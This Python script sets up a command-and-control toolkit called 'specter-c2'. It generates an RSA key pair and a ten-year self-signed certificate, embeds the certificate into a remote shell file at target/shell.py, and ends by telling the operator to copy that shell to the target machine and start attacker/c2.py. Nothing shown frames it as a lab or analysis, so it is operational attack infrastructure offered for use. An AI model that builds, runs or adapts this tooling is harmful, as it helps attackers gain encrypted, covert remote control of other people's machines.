import os
import re
import datetime
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
CERT_PATH  = os.path.join(SCRIPT_DIR, "cert.pem")
KEY_PATH   = os.path.join(SCRIPT_DIR, "key.pem")
SHELL_PATH = os.path.join(SCRIPT_DIR, "..", "target", "shell.py")


def generate():
    print("[*] Generating RSA-2048 key pair...")
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)

    print("[*] Signing self-signed certificate (valid 10 years)...")
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "specter-c2")])
    cert = (
        x509.CertificateBuilder()
        .subject_name(name)
        .issuer_name(name)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(datetime.datetime.utcnow())
        .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=3650))
        .sign(key, hashes.SHA256())
    )

    cert_pem = cert.public_bytes(serialization.Encoding.PEM).decode()
    key_pem  = key.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.TraditionalOpenSSL,
        serialization.NoEncryption(),
    ).decode()

    with open(CERT_PATH, "w") as f:
        f.write(cert_pem)
    print(f"[+] Certificate saved → {CERT_PATH}")

    with open(KEY_PATH, "w") as f:
        f.write(key_pem)
    print(f"[+] Private key saved → {KEY_PATH}")

    return cert_pem


def embed(cert_pem):
    with open(SHELL_PATH, "r") as f:
        content = f.read()

    pattern     = r'# ──CERT_START──\n.*?# ──CERT_END──'
    replacement = f'# ──CERT_START──\nCERT_PEM = """{cert_pem}"""\n# ──CERT_END──'
    new_content = re.sub(pattern, replacement, content, flags=re.DOTALL)

    if new_content == content:
        print("[-] Cert markers not found in shell.py — embedding skipped.")
        return

    with open(SHELL_PATH, "w") as f:
        f.write(new_content)
    print(f"[+] Certificate embedded into {SHELL_PATH}")


if __name__ == "__main__":
    cert_pem = generate()
    embed(cert_pem)
    print("\n[✓] Setup complete.")
    print("    Next: copy target/shell.py to the target machine, then run attacker/c2.py")
